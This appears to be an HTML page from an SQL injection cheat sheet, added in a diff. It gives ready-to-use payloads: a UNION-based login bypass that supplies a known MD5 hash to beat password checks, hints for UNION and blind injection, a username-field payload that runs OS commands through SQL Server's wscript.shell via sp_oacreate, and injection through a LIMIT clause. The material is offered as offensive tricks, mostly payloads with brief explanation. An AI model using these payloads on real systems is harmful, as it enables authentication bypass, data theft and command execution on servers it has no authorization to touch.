@@ -1,0 +1,33 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Tips / Tricks</title>
+</head><body><b>Bypassing second MD5 hash check login screens</b><br/>
+If application is first getting the record by username and then compare returned MD5 with supplied password's MD5 then you need to some extra tricks to fool application to bypass authentication. You can union results with a known password and MD5 hash of supplied password. In this case application will compare your password and your supplied MD5 hash instead of MD5 from database.<br/>
+<br/>
+Bypassing MD5 Hash Check Example<br/>
+Username :admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'<br/>
+Password : 1234<br/>
+81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)<br/>
+<br/>
+<b>Data types, UNION, etc.</b><br/>
+Hints,<br/>
+&nbsp;Always use UNION with ALL because of image similar non-distinct field types. By default union tries to get records with distinct.<br/>
+&nbsp;To get rid of unrequired records from left table use -1 or any not exist record search in the beginning of query (if injection is in WHERE). This can be critical if you are only getting one result at a time.<br/>
+&nbsp;Use NULL in UNION injections for most data type instead of trying to guess string, date, integer etc.<br/>
+&nbsp; Be careful in Blind situtaions may you can understand error is coming from DB or application itself. Because languages like ASP.NET generally throws errors while trying to use NULL values (because normally developers are not expecting to see NULL in a username field)<br/>
+<br/>
+VBS, WSH in SQL Server<br/>
+You can use VBS, WSH scripting in SQL Server because of ActiveX support.<br/>
+<br/>
+declare @o int <br/>
+exec sp_oacreate 'wscript.shell', @o out <br/>
+exec sp_oamethod @o, 'run', NULL, 'notepad.exe' <br/>
+Username: '; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' -- <br/>
+<br/>
+<b>SQL Injection in LIMIT (M) or ORDER (MSO)</b><br/>
+If injection is in second limit you can comment it out or use in your union injection<br/>
+SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;<br/>
+<br/>
+</body></html>
